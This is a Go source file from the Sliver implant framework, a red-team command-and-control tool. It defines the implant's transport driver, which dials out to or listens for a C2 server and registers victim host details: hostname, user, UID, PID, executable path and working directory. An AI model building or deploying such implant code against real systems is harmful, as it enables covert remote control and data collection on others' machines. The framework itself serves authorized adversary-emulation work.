package transports

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"encoding/json"
	"errors"
	insecureRand "math/rand"
	"net"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"google.golang.org/protobuf/proto"
	"google.golang.org/protobuf/reflect/protoreflect"

	consts "github.com/bishopfox/sliver/implant/sliver/constants"
	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
	"github.com/bishopfox/sliver/implant/sliver/version"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// Driver - A driver base type that is embedded by more specialized types like Session or Beacon
// This type is a step -and only a step- toward implementing the c2.Channel interface. However this
// transport base type has a few mandatory/possible roles:
// - Store the Profile (and therefore most of the information) needed to operate the Channel
// - Keep track and make use of the state of a C2 Channel (attempts, failures, errors)
// - Store an optional net.Conn that might be used by some C2 Channels, like MTLS or WireGuard
type Driver struct {
	ID    string        // ID for easy selection
	mutex *sync.RWMutex // Concurrency management

	// Use order of this implant, simply increased at load time by C2s struct
	Priority int

	// For some C2 libraries and models it's useful to have
	// correctly loaded URL object, like for everything HTTP-based
	URI      *url.URL      // used by most protocols
	attempts int           // Number of already tried connections
	failures int           // Number of failed connections
	duration time.Duration // The last duration computed by this transport

	// Profile - This holds the entirety of the information that pertains to this
	// transport. This profile can be embedded at compile time, or loaded on the fly.
	*sliverpb.Malleable

	// conn - A physical connection initiated by/on behalf of this transport.
	// This connection is not always populated, because embedders of the Transport
	// type might use C2 protocols that do not use a net.Conn object, like HTTPS or DNS.
	Conn net.Conn

	// Connection - A TLV-like read/write layer around either a net.Conn stream, or
	// more exotic channels like HTTP, DNS, and other session-based ones. This type
	// is common to ALL channels, and is the smallest common working stuff in all of them.
	*Connection
}

// NewTransportFromBytes - Eventually, we should have all supported transport transports being
// instantiated with this function. It will perform all filtering and setup
// according to the complete URI passed as parameter, and classic templating.
func NewTransportFromBytes(profileData string) (t *Driver, err error) {

	// Base transport settings
	t = &Driver{
		mutex:     &sync.RWMutex{},
		failures:  0,
		attempts:  0,
		Malleable: &sliverpb.Malleable{},
	}

	// Unmarshal from JSON
	err = json.Unmarshal([]byte(profileData), t.Malleable)
	if err != nil {
		return nil, errors.New("Failed to parse string profile")
	}

	// The transport has, by default, the same ID as the Profile
	t.ID = t.Malleable.ID

	// Target
	var fullPath = strings.ToLower(t.C2.String()) + "://" + t.Hostname
	if t.Port > 0 {
		fullPath = fullPath + ":" + strconv.Itoa(int(t.Port))
	}
	fullPath = fullPath + t.Path
	t.URI, err = url.Parse(fullPath)
	if err != nil && t.URI == nil {
		return t, errors.New("URL parsing happened, no URL loaded in C2 driver")
	}

	// {{if .Config.Debug}}
	log.Printf("New transport (Type: %s, CC= %s)", t.Direction.String(), t.URI.String())
	// {{end}}

	return
}

// NewTransportFromProfile - Generate a kinda ready C2 channel driver, from a profile.
func NewTransportFromProfile(p *sliverpb.Malleable) (t *Driver, err error) {

	// Base transport settings
	t = &Driver{
		ID:        p.ID,
		mutex:     &sync.RWMutex{},
		failures:  0,
		attempts:  0,
		Malleable: p,
	}

	// Target
	path := p.Hostname
	if p.Port > 0 {
		path = path + ":" + strconv.Itoa(int(p.Port))
	}
	if p.Path != "" {
		path = path + p.Path
	}
	t.URI, err = url.Parse(strings.ToLower(p.C2.String()) + "://" + path)
	if err != nil && t.URI == nil {
		return t, errors.New("URL parsing happened, no URL loaded in C2 driver")
	}

	// {{if .Config.Debug}}
	log.Printf("New transport (Type: %s, CC= %s)", p.Direction.String(), t.URI.String())
	// {{end}}

	return
}

// NewTransportFromExisting - Instantiate a new transport driver as a copy of an existing one.
// No connections or sessions are transfered, only profile information and operating parameters.
func NewTransportFromExisting(t *Driver) (d *Driver, err error) {
	d = &Driver{
		ID:        t.ID,
		mutex:     &sync.RWMutex{},
		Priority:  t.Priority,
		URI:       t.URI,
		attempts:  t.attempts,
		failures:  t.failures,
		duration:  t.duration,
		Malleable: t.Profile(),
	}
	return
}

// Profile - Returns the C2 Malleable profile stored and used by this transport.
// The Malleable is used for all C2 protocols, and by sessions and beacons alike.
func (t *Driver) Profile() *sliverpb.Malleable {
	return t.Malleable
}

// Transport - Returns itself to the caller. Implements the c2.Channel Transport()
// method, so that higher level Channel types can use and set the transport driver.
func (t *Driver) Transport() *Driver {
	return t
}

// Connect - The driver starts any transport-level protocol connection or listener,
// depending on the Profile direction and transport protocol. This function will, in
// any case, block until a working connection (net.Conn) like is obtained if one is
// wanted (including blocking at listener time), or will return without doing anything.
func (t *Driver) Connect() (conn net.Conn, err error) {
	t.NewAttempt()

	// Basic security values that need to be set
	cryptography.TOTPSecret = string(t.Credentials.TOTPServerSecret) // TODO: move this out of here
	cryptography.CACertPEM = string(t.Credentials.CACertPEM)         // TODO: same

	// Always reinstantiate a blank but ready to work Connection
	t.Connection = NewConnection()

	switch t.Direction {

	case sliverpb.C2Direction_Bind:
		conn, err = t.Listen()
	case sliverpb.C2Direction_Reverse:
		conn, err = t.Dial()
	}

	// We are now either ready to pass our work up to a more specified type,
	// like a Session/Beacon, or we are returning an error.
	return
}

// Register - Prepare a registration message destined to the first C2 link established,
// optionally letting the caller to pass information/statistics about a list of transports
// living in this implant (compiled or runtime-added). This does not cover transport switches.
func (t *Driver) Register(stats []*sliverpb.Transport) (reg *sliverpb.Envelope) {
	var regType uint32
	var registration proto.Message

	// Register a session
	if t.Type == sliverpb.C2Type_Session {
		registration = t.RegisterCore(stats)
		regType = sliverpb.MsgRegister
	}

	// Or register a beacon, wrapping the register into a special envelope,
	// and shutdown the connection after the registration is sent (before next run)
	if t.Type == sliverpb.C2Type_Beacon {
		beaconReg := t.RegisterBeacon()
		beaconReg.Register = t.RegisterCore(stats)
		registration = beaconReg
		regType = sliverpb.MsgBeaconRegister
	}

	// Package the registration message
	return Envelope(regType, registration)
}

// RegisterCore - Prepare a registration message containing only transport-agnostic information,
// except the only parameter: information/statistics about a list of transports in this implant.
func (t *Driver) RegisterCore(stats []*sliverpb.Transport) *sliverpb.Register {
	hostname, err := os.Hostname()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine hostname %s", err)
		// {{end}}
		hostname = ""
	}
	currentUser, err := user.Current()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to determine current user %s", err)
		// {{end}}

		// Gracefully error out
		currentUser = &user.User{
			Username: "<< error >>",
			Uid:      "<< error >>",
			Gid:      "<< error >>",
		}

	}
	filename, err := os.Executable()
	// Should not happen, but still...
	if err != nil {
		//TODO: build the absolute path to os.Args[0]
		if 0 < len(os.Args) {
			filename = os.Args[0]
		} else {
			filename = "<< error >>"
		}
	}

	// {{if .Config.Debug}}
	log.Printf("Session UUID: %s", SessionID)
	// {{end}}

	// Retrieve host UUID
	hostUUID := hostuuid.GetUUID()
	// {{if .Config.Debug}}
	log.Printf("Host UUID: %s", hostUUID)
	// {{end}}

	workDir, _ := os.Getwd()
	// {{if .Config.Debug}}
	log.Printf("Work dir: %s", workDir)
	// {{end}}

	return &sliverpb.Register{
		// Base
		UUID:             SessionID,
		Name:             consts.SliverName,
		HostUUID:         hostUUID,
		Hostname:         hostname,
		Username:         currentUser.Username,
		Uid:              currentUser.Uid,
		Gid:              currentUser.Gid,
		Os:               runtime.GOOS,
		Version:          version.GetVersion(),
		Arch:             runtime.GOARCH,
		Pid:              int32(os.Getpid()),
		Filename:         filename,
		WorkingDirectory: workDir,

		// Transports
		ActiveTransportID: t.ID,
		TransportStats:    stats,
	}
}

// RegisterBeacon - Prepare a beacon registration message.
func (t *Driver) RegisterBeacon() *sliverpb.BeaconRegister {
	nextBeacon := time.Now().Add(t.duration)
	return &sliverpb.BeaconRegister{
		ID:          BeaconID,
		Interval:    t.Interval,
		Jitter:      t.Jitter,
		NextCheckin: nextBeacon.UTC().Unix(),
	}
}

// RegisterSwitch - Prepare a registration message used by a newly started transport, or the current one if the
// switch has failed. The parameter fromTransport is the ID of the old transport, that will be shut down.
func (t *Driver) RegisterSwitch(fromTransport string, stats []*sliverpb.Transport) (reg *sliverpb.Envelope) {

	// Base transport switch information
	register := &sliverpb.RegisterTransportSwitch{
		OldTransportID: fromTransport,
		TransportID:    t.ID,
		Response:       &commonpb.Response{},
	}

	// If the given transport ID is our own, that
	// means the switch failed, we must notify it.
	if fromTransport == t.ID {
		register.Success = false
	} else {
		register.Success = true
	}

	// Base session information is always sent in the session
	// and this also includes transport statistics.
	register.Session = t.RegisterCore(stats)

	// Beacon transport information, if C2 is one
	if t.Type == sliverpb.C2Type_Beacon {
		nextBeacon := time.Now().Add(t.duration)
		register.Beacon = &sliverpb.BeaconRegister{
			ID:          BeaconID,
			Interval:    t.Interval,
			Jitter:      t.Jitter,
			NextCheckin: nextBeacon.UTC().Unix(),
		}
	}

	// Package the message
	return Envelope(sliverpb.MsgRegisterTransportSwitch, register)
}

// NewAttempt - Increase the Channel connection attempt counter.
func (t *Driver) NewAttempt() {
	t.mutex.RLock()
	defer t.mutex.RUnlock()
	t.attempts = t.attempts + 1
}

// WaitOnFailure - Notify an failed attempt to initiate full Session/Beacon
// at some point in the stack, and wait until next reconnect duration expires
func (t *Driver) WaitOnFailure() {
	t.mutex.RLock()
	defer t.mutex.RUnlock()
	if t.failures > 0 {
		t.attempts = t.attempts + 1
	}
	t.failures = t.failures + 1

	// The transport just sleeps for the duration specified
	// as reconnect-on-failure interval (different from beacons intervals).
	time.Sleep(time.Duration(t.Interval))
}

// FailedAttempt - Simply notify an failed attempt to initiate full Session/Beacon
// at some point in the stack, but don't sleep for any interval.
func (t *Driver) FailedAttempt() {
	t.mutex.RLock()
	defer t.mutex.RUnlock()
	if t.failures > 0 {
		t.attempts = t.attempts + 1
	}
	t.failures = t.failures + 1
}

// ResetAttempts - The owner of a driver can request it to set its try/fail
// counters to zero, for example because it's part of a transport switch.
func (t *Driver) ResetAttempts() {
	t.mutex.RLock()
	defer t.mutex.RUnlock()
	t.attempts = 0
	t.failures = 0
}

// Statistics - Returns the number of attempts since the transport's
// last call to Start(), and failures thrown by the transport since.
func (t *Driver) Statistics() (attempts, failures int) {
	t.mutex.Lock()
	defer t.mutex.Unlock()
	return t.attempts, t.failures
}

// Duration - Compute the duration needed for this transport
// Also stores it, so that registration messages can use the
// correct checkin coming from the handlers-serving loops.
func (t *Driver) Duration() time.Duration {
	t.mutex.RLock()
	defer t.mutex.RUnlock()
	p := t.Malleable
	// {{if .Config.Debug}}
	log.Printf("Interval: %v Jitter: %v", p.Interval, p.Jitter)
	// {{end}}
	jitterDuration := time.Duration(0)
	if 0 < p.Jitter {
		jitterDuration = time.Duration(int64(insecureRand.Intn(int(p.Jitter))))
	}
	t.duration = time.Duration(p.Interval) + jitterDuration
	// {{if .Config.Debug}}
	log.Printf("Duration: %v", t.duration)
	// {{end}}
	return t.duration
}

// Envelope - Creates an envelope with the given type and data.
func Envelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
	data, err := proto.Marshal(message)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to encode register msg %s", err)
		// {{end}}
		return nil
	}
	return &sliverpb.Envelope{
		Type: msgType,
		Data: data,
	}
}
